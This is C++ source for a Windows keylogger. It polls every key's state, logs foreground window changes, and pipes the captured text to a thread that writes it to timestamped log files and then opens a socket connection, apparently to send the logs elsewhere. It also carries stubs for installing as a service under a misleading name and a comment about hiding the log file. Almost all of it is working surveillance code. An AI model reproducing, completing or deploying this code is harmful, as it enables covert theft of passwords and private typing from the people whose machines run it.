#define _CRT_SECURE_NO_WARNINGS
#include "stdafx.h"
#include <windows.h>
#include <string>
#include <iostream>
#include <fstream>
#include <thread>
#include <time.h>
#include "SocketConnection.h"
#include "MD5.h"

#define STR_LEN 512

using namespace std;

BOOL Install_Logger_Service();
void Initialize_Service();
void WINAPI Create_Service(DWORD, CHAR**);
void WINAPI Handle_Controls(DWORD control_code);


BOOL Logger();


wchar_t service_name[100] = TEXT("Local Sex Daemon");
SERVICE_STATUS serv_status;
SERVICE_STATUS_HANDLE serv_handle = 0;
HANDLE stop_service = 0;
HHOOK hook_handle;




HANDLE hPipe2 = CreateNamedPipe(L"\\\\.\\pipe\\MyPipe2", PIPE_ACCESS_INBOUND, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE,
	1, STR_LEN, STR_LEN, 0, NULL);

HANDLE hPipe = CreateFile(L"\\\\.\\pipe\\MyPipe2", GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

string KeycodeToUnicode(unsigned int key, HKL keyboardLayoutHandle, bool shiftPressed, bool ctrlPressed, bool altPressed, bool capsLock);


void Reader()
{

	ConnectNamedPipe(hPipe2, NULL);
	DWORD LOL;
	DWORD dwTick = { 0 };



	while (true)
	{

		if (((GetTickCount() - dwTick) > 5000))
		{

			dwTick = GetTickCount();
			cout << "ALARM";



			time_t     now = time(0);
			struct tm  tstruct;
			wchar_t       timeBuf[100], source[200];
			tstruct = *localtime(&now);
			wcscpy(source, L"..\\logs\\");
			wcsftime(timeBuf, sizeof(timeBuf), L"%Y-%m-%d-%H-%M-%S", &tstruct);
			wcscat(source, timeBuf);
			wcscat(source, L".klf");
			HANDLE logFile = CreateFile(source, GENERIC_WRITE, 0, NULL, CREATE_NEW, 0, NULL);
			LOL = GetLastError();

			wchar_t buf[1000];
			DWORD dwReadByte = { 0 };
			DWORD numb_bytes{ 0 };
			while (ReadFile(hPipe2, &buf, sizeof(buf), &dwReadByte, NULL))
			{
				int ssize = 0;
				for (ssize = 0; ssize < sizeof(buf); ssize++)
				{
					if (buf[ssize] == '\0')
						break;
				}
				
				int neededSize=WideCharToMultiByte(CP_ACP, NULL, buf, wcslen(buf), NULL, NULL, NULL, NULL);
				char* neededChar = new char[neededSize+1];
				WideCharToMultiByte(CP_ACP, NULL, buf, wcslen(buf), neededChar, neededSize, NULL, NULL);
				neededChar[neededSize] = '\0';
				WriteFile(logFile, neededChar, neededSize, &numb_bytes, NULL);
				if (((GetTickCount() - dwTick) > 5000))
					break;
			}
			numb_bytes = { 0 };
			
			CloseHandle(logFile);

			SocketConnection* a = new SocketConnection();
			a->Connect();
			
			string sex = md5("grape");
			cout << sex;
	}

		

	}
}

int main() {
	wchar_t window_text[500];
	wchar_t old_window_text[500];
	TCHAR latest_key[50];
	TCHAR file_name[MAX_PATH + 1];
	TCHAR write_name[500];
	int i;
	int virt_key;
	HANDLE file_handle;
	HWND fore_hndl;
	
	//GetSystemDirectory(file_name, MAX_PATH + 1);
	wcscpy(file_name, L"MahLogSon");
	wofstream myFile;
	myFile.open("testfile.txt",std::ios::out | std::ios::binary);
	std::locale loc("russian");
	myFile.imbue(loc);// Could make it hidden or
	//something if you wanted
	//FILE_ATTRIBUTE_HIDDEN

	byte teclas[256];
	char teclasespeciales[32];

	bool first_time = true, shift = false, alt = false, ctrl = false, capslock = false;
	bool keystate[256];
	DWORD numb_bytes;
	std::thread readThread(Reader);
	while (1)
	{
		Sleep(0);

		numb_bytes = { 0 };
		fore_hndl = GetForegroundWindow();
		if (fore_hndl != NULL)
		{
			if (GetWindowText(fore_hndl, window_text, 499) != 0)
			{
				setlocale(LC_ALL, ".1251");

				if (wcscmp(window_text, old_window_text) != 0)
				{
					std::wcout.clear();
					std::wcout << "\r\n1 " << window_text << "\r\n2 ";
					std::wcout << old_window_text;
					std::wcout.flush();
					time_t     now = time(0);
					struct tm  tstruct;
					wchar_t       timeBuf[100];
					tstruct = *localtime(&now);
					wcsftime(timeBuf, sizeof(timeBuf), L"%Y-%m-%d-%H:%M:%S", &tstruct);
					wcscpy(write_name, L"\r\n");
					wcscat(write_name, timeBuf);
					wcscat(write_name, L" {Active Window Changed}->");
					wcscat(write_name, window_text);
					wcscat(write_name, L"\r\n");
					WriteFile(hPipe, write_name, sizeof(write_name), &numb_bytes, NULL);
					wcscpy(old_window_text, window_text);
					

				}
			}
		}

		numb_bytes = { 0 };



		for (int i = 0; i < 255; i++)
		{
			if (GetAsyncKeyState(i) == -32767)
			{

				HKL locale = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));

				int scanCodeEx = MapVirtualKeyExW(i, MAPVK_VK_TO_VSC_EX, locale);

				wchar_t buffer[5];
				unsigned char lpKeyState[256] = { 0 };
				ToUnicodeEx(i, scanCodeEx, lpKeyState, buffer, sizeof(buffer), 0, locale);

				wcscpy(latest_key, buffer);
				if (wcscmp(latest_key, L"") != 0)
				{
					wchar_t temp = latest_key[0];
					WriteFile(hPipe, latest_key, 4, &numb_bytes, NULL);

					Sleep(10);
					break;
				}
			}

			numb_bytes = { 0 };
		}
	}


	CloseHandle(file_handle);
	CloseHandle(hPipe);
	return TRUE;


	return 0;
}

